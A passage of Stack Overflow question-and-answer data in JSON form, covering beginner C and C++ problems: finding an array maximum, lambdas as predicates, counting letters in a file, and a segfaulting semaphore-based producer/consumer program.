3723, "user_id": 1169091, "user_type": "registered", "accept_rate": 9, "profile_image": "https://i.stack.imgur.com/5vE4L.jpg?s=128&g=1", "display_name": "nicomp", "link": "https://stackoverflow.com/users/1169091/nicomp"}, "edited": false, "score": 0, "creation_date": 1476236131, "post_id": 39989167, "comment_id": 67256998, "body": "You can&#39;t move it outside the loop. There is no known value of auction[0] outside the loop."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1476237400, "post_id": 39989167, "comment_id": 67257280, "body": "You must validate <b><i>every</i></b> call to <code>fscanf</code> to insure you are processing an actual value, not just garbage, (e.g. <code>if (fscanf(ifp, &quot;%d&quot;, &amp;header) != 1) { &#47;* handle error *&#47; }</code>) If you have a <i>matching failure</i> or <i>conversion failure</i> and fail to handle the error, you are in uncharted water from then on."}, {"owner": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1476237495, "post_id": 39989167, "comment_id": 67257307, "body": "@DavidC.Rankin agreed, but then this is a hackerrank style question - they don&#39;t really care about error conditions :)"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1476237743, "post_id": 39989167, "comment_id": 67257367, "body": "Ah, but still, it is coding malpractice not to validate, and since a number of new coders are likely to view the question, it is definitely worth a comment to drive that point home. (or maybe a couple of comments <code>:)</code>"}, {"owner": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "edited": false, "score": 0, "creation_date": 1476238857, "post_id": 39989167, "comment_id": 67257611, "body": "@Josh Did you notice that the cases you failed on had the maximum value as the <i>first</i> one in the list? That should have given you a very clear hint as to where your problem lay. And, yes, you really need to check error returns: what happens if <code>fopen</code> fails?"}], "answers": [{"comments": [{"owner": {"reputation": 55, "user_id": 6951608, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3c3d6e788186b06d3c833a30e4262fcd?s=128&d=identicon&r=PG&f=1", "display_name": "Josh", "link": "https://stackoverflow.com/users/6951608/josh"}, "edited": false, "score": 0, "creation_date": 1476238292, "post_id": 39989203, "comment_id": 67257489, "body": "So where should it go? I put it outside the for loops and now have some massive number for the first and last..."}], "tags": [], "owner": {"reputation": 21, "user_id": 7004810, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/7223ccfd97456821e8ab4a465a925bd6?s=128&d=identicon&r=PG", "display_name": "dbn", "link": "https://stackoverflow.com/users/7004810/dbn"}, "is_accepted": false, "score": 2, "last_activity_date": 1476236048, "creation_date": 1476236048, "answer_id": 39989203, "question_id": 39989167, "link": "https://stackoverflow.com/questions/39989167/c-find-maximum-value-in-array/39989203#39989203", "title": "C - Find maximum value in array", "body": "<p>You set max = auction[0]; on every loop, eliminating your previous max value. </p>\n\n<p>Initialize the max value only once within the loop, or initialize max outside the loop (after reading the first value).</p>\n"}, {"comments": [{"owner": {"reputation": 3723, "user_id": 1169091, "user_type": "registered", "accept_rate": 9, "profile_image": "https://i.stack.imgur.com/5vE4L.jpg?s=128&g=1", "display_name": "nicomp", "link": "https://stackoverflow.com/users/1169091/nicomp"}, "edited": false, "score": 0, "creation_date": 1476236427, "post_id": 39989210, "comment_id": 67257070, "body": "Outside the loop, set max equal to the smallest integer in your compiler. If you have limits.h, set max to INT_MIN."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1476236745, "post_id": 39989210, "comment_id": 67257125, "body": "Why did you comment on your answer? You can <a href=\"https://stackoverflow.com/posts/39989210/edit\">edit</a> it to add the additional information."}], "tags": [], "owner": {"reputation": 3723, "user_id": 1169091, "user_type": "registered", "accept_rate": 9, "profile_image": "https://i.stack.imgur.com/5vE4L.jpg?s=128&g=1", "display_name": "nicomp", "link": "https://stackoverflow.com/users/1169091/nicomp"}, "is_accepted": false, "score": 1, "last_activity_date": 1476236093, "creation_date": 1476236093, "answer_id": 39989210, "question_id": 39989167, "link": "https://stackoverflow.com/questions/39989167/c-find-maximum-value-in-array/39989210#39989210", "title": "C - Find maximum value in array", "body": "<p>You are finding the last number in the list that is bigger than auction[0]</p>\n"}, {"tags": [], "owner": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "is_accepted": false, "score": 0, "last_activity_date": 1476239072, "last_edit_date": 1476239072, "creation_date": 1476238714, "answer_id": 39989504, "question_id": 39989167, "link": "https://stackoverflow.com/questions/39989167/c-find-maximum-value-in-array/39989504#39989504", "title": "C - Find maximum value in array", "body": "<p>The canonical implementation of a <strong>linear</strong> <code>max_value</code> loop is something like this</p>\n\n<p>Given</p>\n\n<ul>\n<li>N values</li>\n<li>MIN_N &lt;= N &lt;= MAX_N</li>\n</ul>\n\n<p><code>\nmax_value = MIN_N\nfor i in 1...N\n    if values[i] &gt; max_value\n         max_value = values[i]\n</code></p>\n\n<p>Now, you can either read all the values into an array (I've called it <code>values</code> above), or simply read in the values one at a time.</p>\n\n<p>Converting this to C, and assuming an array for simplicity here:</p>\n\n<pre><code>int max_value = MIN_N;\nfor (int i = 0; i &lt; N; ++i) {\n    if (values[i] &gt; max_value)\n        max_value = values[i];\n}\nprintf(\"Max %d\\n\", max_value);\n</code></pre>\n\n<p>For your actual assignment, you need to wrap this in a loop to deal with all the test cases. I'd probably read numbers as I went to avoid the need for memory management etc.</p>\n\n<pre><code>FILE *f = open_input_file(); // could return stdin for testing\nint T = read_an_integer(f);\n\nfor (int t = 0; t &lt; T; +=t) {\n    int N = read_an_integer(f);\n    int max_value = MIN_N;\n\n    if (N &lt;= 0) continue;\n\n    for (int n = 0; n &lt; N; ++n) {\n        int v = read_an_integer(f);\n        if (v &gt; max_value)\n             max_value = v;\n    }\n\n    printf(\"Max %d\\n\", max_value);\n}\nclose_my_file(f);\n</code></pre>\n\n<p>I'll leave the file handling and I/O as an exercise - but make sure you deal with all error conditions (in this case calling <code>exit(-1)</code> is probably sufficient).</p>\n"}], "owner": {"reputation": 55, "user_id": 6951608, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3c3d6e788186b06d3c833a30e4262fcd?s=128&d=identicon&r=PG&f=1", "display_name": "Josh", "link": "https://stackoverflow.com/users/6951608/josh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2336, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1476239072, "creation_date": 1476235785, "last_edit_date": 1476237580, "question_id": 39989167, "link": "https://stackoverflow.com/questions/39989167/c-find-maximum-value-in-array", "title": "C - Find maximum value in array", "body": "<p>I'm working on a program here and I am accessing file input and am looping through an array of values in the file. However, it's not properly calculating the maximum value. Any help?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\nint header, i, j, cur_val, auction[50], sum = 0;\nint max = 0;\n\nFILE * ifp;\n\nifp = fopen(\"input.txt\", \"r\");\n\nfscanf(ifp, \"%d\", &amp;header);\n\nfor (i = 0; i &lt; header; i++) {\n\n    fscanf(ifp, \"%d\", &amp;cur_val);\n    printf(\"%d\\n\", cur_val);\n\n    for (j = 0; j &lt; cur_val; j++) {\n        fscanf(ifp, \"%d\", &amp;auction[j]);\n\n        printf(\"%d\\n\", auction[j]);\n\n        max = auction[0];\n        if (auction[j] &gt; max) {\n            max = auction[j];\n        }\n\n    }//end j loop\n\n    printf(\"Max: %d\\n\", max);\n    printf(\"\\n\");\n    //printf(\"Auction %d was sold for $%.2f!\\n\", i+1, );\n    //sum+=max;\n\n}//end i loop\n\nfclose(ifp);\n\n\nreturn 0;\n\n}\n</code></pre>\n\n<p>Here's the file input:</p>\n\n<pre><code>5\n\n4\n\n100 500 250 300\n\n1\n\n700\n\n3\n\n300 150 175\n\n2\n\n920 680\n\n8\n\n20 10 15 25 50 30 19 23\n</code></pre>\n\n<p>The max values printed to the console are as follows: </p>\n\n<pre><code>300 700 300 920 23\n</code></pre>\n\n<p>The middle 3 work but not the first and last. Any idea why?</p>\n"}, {"tags": ["java", "c++", "c", "predicate", "predicates"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 1, "creation_date": 1476238619, "post_id": 39988975, "comment_id": 67257549, "body": "How about <code>std::function&lt;bool(string)&gt;</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 17580, "user_id": 493106, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/48b0c7ab491edf2f69e63773181a22b5?s=128&d=identicon&r=PG", "display_name": "xaxxon", "link": "https://stackoverflow.com/users/493106/xaxxon"}, "is_accepted": true, "score": 4, "last_activity_date": 1476234286, "creation_date": 1476234286, "answer_id": 39988985, "question_id": 39988975, "link": "https://stackoverflow.com/questions/39988975/c-c-equivalent-of-java-predicate/39988985#39988985", "title": "C/C++ Equivalent of Java Predicate", "body": "<p>C++ has lambdas which appear to be quite similar to the java construct you're using:</p>\n\n<pre><code>auto i = [](string const &amp; s){return s == \"ABCD\";}\n</code></pre>\n\n<p>It doesn't have the built in chaining, but the concept is similar - an inline-defined function.  You can use the C++ logic constructs to combine the lambdas into any construct you'd like -- even use a lambda to do it. </p>\n\n<pre><code>auto final_check = [i,j,k,l,m,n](string const &amp; s){return i(s) || j(s) || k(s).....};\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 3864, "user_id": 620908, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2abd643ecb33f1a18a7a4f976cef0dbe?s=128&d=identicon&r=PG", "display_name": "Adrian Colomitchi", "link": "https://stackoverflow.com/users/620908/adrian-colomitchi"}, "is_accepted": false, "score": 2, "last_activity_date": 1476235704, "last_edit_date": 1476235704, "creation_date": 1476235105, "answer_id": 39989094, "question_id": 39988975, "link": "https://stackoverflow.com/questions/39988975/c-c-equivalent-of-java-predicate/39989094#39989094", "title": "C/C++ Equivalent of Java Predicate", "body": "<p>Simplified syntax is <code>auto lambdaName=[ &lt;capture&gt; ] ( &lt;params&gt; ) -&gt; &lt;ret&gt; { body }</code> </p>\n\n<ul>\n<li><code>[&lt;capture&gt;]</code> is the list of Java <code>final vars or effectively finals</code> captured by the lambda, you get to declare them here rather than mark them as <code>final</code></li>\n<li><code>(&lt;params&gt;)</code> is the list of parameters for your lambda </li>\n<li><code>ret</code> - returned type - optional if your lambda is simple enough for the compiler to deduce the returned type</li>\n<li><code>{ body }</code> - self evident</li>\n</ul>\n\n<p>Fully blown explanation on <a href=\"http://en.cppreference.com/w/cpp/language/lambda\" rel=\"nofollow\">syntax of C++11 lambda functions</a></p>\n\n<p>In your case:</p>\n\n<pre><code>auto i = [/* no capture */]\n          (const std::string&amp; s) // params\n          // no ret type spec: simple enough, the compiler will deduce it\n          { return s==\"ABCD\"; }\n;\n// calling it is just as simple as\nstd::string str=\"xyz\";\n// no more i.test(str), you just call it as a function\nbool res0 = i(str); // will be false\n\n\nconst char* charStr=\"mnp\";\nbool res1 = i(charStr); // the compiler knows the charStr can be converted\n                        // to std::string and will generate the code\n                        // for this conversion.\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15610, "user_id": 2456565, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xa8D9.png?s=128&g=1", "display_name": "krzaq", "link": "https://stackoverflow.com/users/2456565/krzaq"}, "is_accepted": false, "score": 1, "last_activity_date": 1476236139, "last_edit_date": 1592644375, "creation_date": 1476235194, "answer_id": 39989104, "question_id": 39988975, "link": "https://stackoverflow.com/questions/39988975/c-c-equivalent-of-java-predicate/39989104#39989104", "title": "C/C++ Equivalent of Java Predicate", "body": "<p>For predicates C++ has function object templates that could be used with conjunction with <a href=\"http://en.cppreference.com/w/cpp/utility/functional/bind\" rel=\"nofollow noreferrer\"><code>std::bind</code></a> or lambdas:</p>\n<pre><code>auto i = [](auto const&amp; v){ return v == &quot;ABCD&quot;; };\nauto j = [](auto const&amp; v){ return v == &quot;EFGH&quot;; };\nauto k = bind(equal_to&lt;&gt;{}, &quot;IJKL&quot;, placeholders::_1);\nauto l = bind(equal_to&lt;&gt;{}, &quot;MNOP&quot;, placeholders::_1);\n</code></pre>\n<p><code>bind</code> is controversial and it's not impossible that it'll be slated for deprecation in future standards, so it's often advisable to use lambdas in its stead.</p>\n<p>You can use Boost.Fusion or Boost.Hana to make a similar statement to your chain of ors:</p>\n<pre><code>fusion::any(fusion::make_tuple(i, j, k, l), [](auto const&amp; p){ return p(&quot;ABCD&quot;); })\nhana::any_of(hana::make_tuple(i, j, k, l), [](auto const&amp; p){ return p(&quot;ABCD&quot;); })\n</code></pre>\n<p>live:\n<a href=\"http://melpon.org/wandbox/permlink/z65yYzSqL69ixRXT\" rel=\"nofollow noreferrer\">fusion</a>,\n<a href=\"http://melpon.org/wandbox/permlink/xTukIMeCNVbvQAdO\" rel=\"nofollow noreferrer\">hana</a></p>\n<p>Alternatively, since C++17 you can use <a href=\"http://en.cppreference.com/w/cpp/language/fold\" rel=\"nofollow noreferrer\">fold expressions</a> for this:</p>\n<pre><code>auto const any_of = [](char const* str, auto&amp;&amp;... vs) {\n    return (... || vs(str));\n};\n\nany_of(&quot;ABCD&quot;, i, j, k, l)\n</code></pre>\n<p><a href=\"http://melpon.org/wandbox/permlink/GKltcR9TfE6bkTYJ\" rel=\"nofollow noreferrer\">live demo</a></p>\n"}], "owner": {"reputation": 214, "user_id": 1319563, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2e5210beeb0389d2dc268b5f4f9df619?s=128&d=identicon&r=PG&f=1", "display_name": "Samet Tonyal\u0131", "link": "https://stackoverflow.com/users/1319563/samet-tonyal%c4%b1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 517, "favorite_count": 0, "accepted_answer_id": 39988985, "answer_count": 3, "score": 0, "last_activity_date": 1476236139, "creation_date": 1476234196, "question_id": 39988975, "link": "https://stackoverflow.com/questions/39988975/c-c-equivalent-of-java-predicate", "title": "C/C++ Equivalent of Java Predicate", "body": "<p>Is there a C/C++ equivalent structure/class of Predicate class in Java?</p>\n\n<p>Specifically, I have a very simple Java code as given below.</p>\n\n<pre><code>import java.util.function.Predicate;\npublic class JavaPredicates {\n    public static void main(String[] args) {\n        Predicate&lt;String&gt; i  = (s)-&gt; s.equals(\"ABCD\");\n        Predicate&lt;String&gt; j  = (s)-&gt; s.equals(\"EFGH\");\n        Predicate&lt;String&gt; k  = (s)-&gt; s.equals(\"IJKL\");\n        Predicate&lt;String&gt; l  = (s)-&gt; s.equals(\"MNOP\");\n        Predicate&lt;String&gt; m  = (s)-&gt; s.equals(\"QRST\");\n        Predicate&lt;String&gt; n  = (s)-&gt; s.equals(\"UVWYZ\");\n\n        System.out.println(i.or(j).or(k).or(l).or(m).or(n).test(\"ABCD\"));\n    }\n}\n</code></pre>\n\n<p>I want to implement the same program in C or C++. Is there a default way or an external library for doing this?</p>\n"}, {"tags": ["c", "io", "overflow"], "comments": [{"owner": {"reputation": 630, "user_id": 1124541, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/e006ff87dbd1981c0774bd4619ca99dd?s=128&d=identicon&r=PG", "display_name": "inbinder", "link": "https://stackoverflow.com/users/1124541/inbinder"}, "edited": false, "score": 0, "creation_date": 1476234340, "post_id": 39988901, "comment_id": 67256622, "body": "How are you determining that int size = 26? And is this supposed to be for a particular &quot;known&quot; file or any file?"}, {"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 2, "creation_date": 1476234361, "post_id": 39988901, "comment_id": 67256624, "body": "a) You never set charCounters to all 0. b) why do you even have a for loop in that file reading section?"}, {"owner": {"reputation": 49, "user_id": 7003889, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755070c7baaab684ff4b19d61ea1bcdf?s=128&d=identicon&r=PG&f=1", "display_name": "nichow", "link": "https://stackoverflow.com/users/7003889/nichow"}, "edited": false, "score": 0, "creation_date": 1476234473, "post_id": 39988901, "comment_id": 67256641, "body": "the array is for each letter of the alphabet"}, {"owner": {"reputation": 49, "user_id": 7003889, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755070c7baaab684ff4b19d61ea1bcdf?s=128&d=identicon&r=PG&f=1", "display_name": "nichow", "link": "https://stackoverflow.com/users/7003889/nichow"}, "edited": false, "score": 0, "creation_date": 1476234787, "post_id": 39988901, "comment_id": 67256697, "body": "the file will only contain lowercase letters. My idea was to go through for each letter and increment a counter."}, {"owner": {"reputation": 49, "user_id": 7003889, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755070c7baaab684ff4b19d61ea1bcdf?s=128&d=identicon&r=PG&f=1", "display_name": "nichow", "link": "https://stackoverflow.com/users/7003889/nichow"}, "edited": false, "score": 0, "creation_date": 1476235253, "post_id": 39988901, "comment_id": 67256798, "body": "that helped, thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1476299392, "creation_date": 1476299392, "answer_id": 40006535, "question_id": 39988901, "link": "https://stackoverflow.com/questions/39988901/interactions-with-counters-and-file-i-o/40006535#40006535", "title": "interactions with counters and file i/o", "body": "<p>the logic of the first <code>for()</code> loop is not correct. suggest something like:</p>\n\n<pre><code>#include &lt;ctype.h&gt;\n....\n// initialize to all 0s\nint charCounters[26] = {0};\n....\nwhile(fscanf(file1, \"%c\", &amp;c) == 1) \n{\n    if( isalpha(c) )\n    {  // then alphabet a...z or A...Z\n        // -'a' to get offset from lower case 'a'\n        // to use as index into array\n        charCounters[ tolower(c)-'a' ]++;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 7003889, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755070c7baaab684ff4b19d61ea1bcdf?s=128&d=identicon&r=PG&f=1", "display_name": "nichow", "link": "https://stackoverflow.com/users/7003889/nichow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 31, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476299392, "creation_date": 1476233524, "last_edit_date": 1476235208, "question_id": 39988901, "link": "https://stackoverflow.com/questions/39988901/interactions-with-counters-and-file-i-o", "title": "interactions with counters and file i/o", "body": "<p>I have a program that is supposed to count the number of times a letter appears in a text file. </p>\n\n<pre><code>void file_histogram(char *filename)\n{\n  FILE *file1;\n    file1 = fopen(filename, \"r\");\n    int size = 26;\n    int charCounters[size];\n    char c;\n    int i, j;\n\n    if(file1 != NULL) {\n        while(fscanf(file1, \"%c\", &amp;c) == 1) {\n            for(i = 0; i &lt; size; ++i) {\n                if(c == i + 97) {\n                    charCounters[i]++;\n                    break;\n                }\n            }\n        }\n    }\n    for(j = 0; j &lt; size; ++j)\n        printf(\"%c: %d\\n\", j + 97, charCounters[j]);\n    fclose(file1);\n</code></pre>\n\n<p>what this seems to be doing is counting the first character twice, and then about half are correctly counted, and the other half all seemed to reach the max or overflow. what exactly is going on here? </p>\n"}, {"tags": ["c", "linux", "segmentation-fault", "semaphore", "producer-consumer"], "comments": [{"owner": {"reputation": 898, "user_id": 3327376, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa7d48656cb0ca601d075d37db1b0f5e?s=128&d=identicon&r=PG", "display_name": "Matt", "link": "https://stackoverflow.com/users/3327376/matt"}, "edited": false, "score": 3, "creation_date": 1476233375, "post_id": 39988874, "comment_id": 67256438, "body": "Can you try running the code in GDB to find exactly where segfault happens?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 3, "creation_date": 1476233810, "post_id": 39988874, "comment_id": 67256514, "body": "Use gdb as advised to find exact seg fault line. But for starters: <code>info-&gt;id=i;</code> can cause a seg fault because <code>info</code> is an uninitialised pointer. Other errors include passing the same <code>info</code> pointer to all threads which means each thread will see a random value of <code>info-&gt;id</code> and also <code>main</code> does not wait for the threads to complete (<code>pthread_join</code>) before exiting."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1476284161, "post_id": 39988874, "comment_id": 67281384, "body": "Welcome to Stack Overflow! To help people answer your question, you&#39;ll need to be more specific about the error.  Please <a href=\"https://stackoverflow.com/posts/39988874/edit\">edit</a> your post to incorporate the exact stack trace you get from running your <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> (preferably using copy+paste to avoid transcription errors)."}], "answers": [{"tags": [], "owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "is_accepted": true, "score": 1, "last_activity_date": 1476284774, "creation_date": 1476284774, "answer_id": 40002055, "question_id": 39988874, "link": "https://stackoverflow.com/questions/39988874/segmentation-fault-in-the-below-c-code-compiled-in-linux/40002055#40002055", "title": "Segmentation fault in the below c code compiled in linux", "body": "<p>First, fix these compilation errors:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>g++ -std=c++17 -fPIC -g -Wall -Wextra -Wwrite-strings -Wno-parentheses -Wpedantic -Warray-bounds -O2 -Weffc++      39988874.cpp    -o 39988874\n39988874.cpp: In function \u2018void* chef(void*)\u2019:\n39988874.cpp:43:25: error: \u2018insert_item\u2019 was not declared in this scope\n         if (insert_item()) {\n                         ^\n39988874.cpp:48:16: error: \u2018sleep\u2019 was not declared in this scope\n         sleep(1);\n                ^\n39988874.cpp:36:18: warning: unused parameter \u2018param\u2019 [-Wunused-parameter]\n void *chef(void *param)\n                  ^~~~~\n39988874.cpp: In function \u2018void* customer(void*)\u2019:\n39988874.cpp:58:68: warning: format \u2018%d\u2019 expects argument of type \u2018int\u2019, but argument 2 has type \u2018int*\u2019 [-Wformat=]\n     printf(\"Guest %d arrives and wants to eat %d food\\n\", id, toeat);\n                                                                    ^\n39988874.cpp:63:25: error: \u2018remove_item\u2019 was not declared in this scope\n         if (remove_item()) {\n                         ^\n39988874.cpp:67:77: warning: format \u2018%d\u2019 expects argument of type \u2018int\u2019, but argument 2 has type \u2018int*\u2019 [-Wformat=]\n             printf(\"Guest %d eats a tandoori chicken[%d/%d]\\n\", id,ate,toeat);\n                                                                             ^\n39988874.cpp:71:54: warning: format \u2018%d\u2019 expects argument of type \u2018int\u2019, but argument 2 has type \u2018int*\u2019 [-Wformat=]\n             printf(\"Guest %d finishes and exits\\n\",id);\n                                                      ^\n39988874.cpp:79:20: error: \u2018sleep\u2019 was not declared in this scope\n         sleep(toeat);\n                    ^\n39988874.cpp:56:32: warning: unused variable \u2018t\u2019 [-Wunused-variable]\n     int toeat=1+rand()%4,ate=0,t=nofCustomers;\n                                ^\n39988874.cpp:81:1: warning: no return statement in function returning non-void [-Wreturn-type]\n }\n ^\n&lt;builtin&gt;: recipe for target '39988874' failed\nmake: *** [39988874] Error 1\n</code></pre>\n\n<p>(hint: you'll need <code>#include &lt;unistd.h&gt;</code> for <code>sleep()</code>; also, you'll want <code>int id = ((threadInfo*)param)-&gt;id</code>)</p>\n\n<p>Having fixed those, you'll be left with</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>39988874.cpp: In function \u2018int main()\u2019:\n39988874.cpp:133:17: warning: \u2018info\u2019 may be used uninitialized in this function [-Wmaybe-uninitialized]\n         info-&gt;id=i;\n         ~~~~~~~~^~\n</code></pre>\n\n<p>Which is quite obviously caused by</p>\n\n<pre><code>struct threadInfo *info;\n/* ... */\nfor (i = 1; i &lt;= nofCustomers; i++) {\n    info-&gt;id=i;\n}\n</code></pre>\n\n<p>There's your problem.  You need to make <code>info</code> point to some valid storage.</p>\n"}], "owner": {"reputation": 31, "user_id": 7004627, "user_type": "registered", "profile_image": "https://graph.facebook.com/553860091466600/picture?type=large", "display_name": "Kryshna Krysh", "link": "https://stackoverflow.com/users/7004627/kryshna-krysh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 207, "favorite_count": 0, "accepted_answer_id": 40002055, "answer_count": 1, "score": 2, "last_activity_date": 1476284774, "creation_date": 1476233223, "question_id": 39988874, "link": "https://stackoverflow.com/questions/39988874/segmentation-fault-in-the-below-c-code-compiled-in-linux", "title": "Segmentation fault in the below c code compiled in linux", "body": "<p>we simulate a tandoori chicken lunch buffet restaurant with one chef and\nmultiple guests, which is similar to a single producer/multiple consumers problem. We\nimplement one program with multiple threads, each of which holds either a chef or a guest.\nWe also apply one synchronization tool \u2013 semaphores, which can solve an issue for\nsynchronizing common resources with multiple threads. Through this project, we will learn\nhow to create multi-threaded process and how to synchronize threads using semaphores.</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;semaphore.h&gt;\n\nstruct threadInfo\n{\nint id;\n};\n\n/* input variables */\nint nofCustomers=4,item,nofChicken=3;\npthread_attr_t attr; /*Set of thread attributes*/\npthread_t chef_t,customer_t[100];\n/* the semaphores */\nsem_t full, empty;\nvoid *chef(void *param); /* the producer thread */\nvoid *customer(void *param); /* the consumer thread */\n\nvoid initializeData() \n{\n\n/* Create the full semaphore and initialize to 0 */\nsem_init(&amp;full, 0, 0);\n\n/* Create the empty semaphore and initialize to BUFFER_SIZE */\nsem_init(&amp;empty, 0, nofChicken);\n\n/* Get the default attributes */\npthread_attr_init(&amp;attr);\n\n}\n</code></pre>\n\n<p>PRODUCER</p>\n\n<pre><code> /* Producer Thread */\n void *chef(void *param) \n{\n printf(\"Chef Starts Cooking\\n\");\n while(1) \n{\n  /* acquire the empty lock */\n  sem_wait(&amp;empty);\n\n  if(insert_item()) \n  {\n     fprintf(stderr, \" Producer report error condition\\n\");\n  }\n  /* signal full */\n  sem_post(&amp;full);\n  sleep(1);\n }\n }\n</code></pre>\n\n<p>cONSUMER</p>\n\n<pre><code> /* Consumer Thread */\n void *customer(void *param) \n {\n   int toeat=1+rand()%4,ate=0,t=nofCustomers;\n   int *id=(int*)param;\n   printf(\"Guest %d arrives and wants to eat %d food\\n\", id, toeat);\n   while(1) \n   {\n     /* aquire the full lock */\n     sem_wait(&amp;full);\n\n     if(remove_item()) \n     {\n      fprintf(stderr, \"Consumer report error condition\\n\");\n     }\n     else \n     {\n   ate++;\n       printf(\"Guest %d eats a tandoori chicken[%d/%d]\\n\", id,ate,toeat);\n      }\n     if(ate==toeat)\n     {\n        nofCustomers--;\n    printf(\"Guest %d finishes and exits\\n\",id);\n     }\n     if(nofCustomers==0)\n     {\n    printf(\"All guests finish eating and exit\\n\");\n    break ;\n     }\n     /* signal empty */\n     sem_post(&amp;empty);\n     sleep(toeat);\n   }\n }\n</code></pre>\n\n<p>iNC IN CRITICAL SECTION</p>\n\n<pre><code>/* Cook food */\nint insert_item() \n{\n   /* When the item is not full,cook food\n   increment the item*/\n  if(item &lt;= nofChicken) \n  { \n    item++;\n    printf(\"Chef cooks one tandoori chicken.[%d/%d]\\n\",item,nofChicken);\n    return 0;\n   }\n   else \n   { /* Error the items are full */\n      return -1;\n    }\n }\n</code></pre>\n\n<p>DEC IN CRITICAL SECTION</p>\n\n<pre><code>  /* Eat food */\n int remove_item() {\n /* When the items is/are cooked, eat the item\n   i.e.., decrement the item */\n  if(item &gt; 0)\n  { \n     item--;\n     return 0;\n   }\n   else { /* Error no items */\n    return -1;\n   }\n }\n</code></pre>\n\n<p>maIN FUNCTION</p>\n\n<pre><code> int main()\n {\n   /* Loop counter */\n   int i;\n   struct threadInfo *info;\n\n   //input 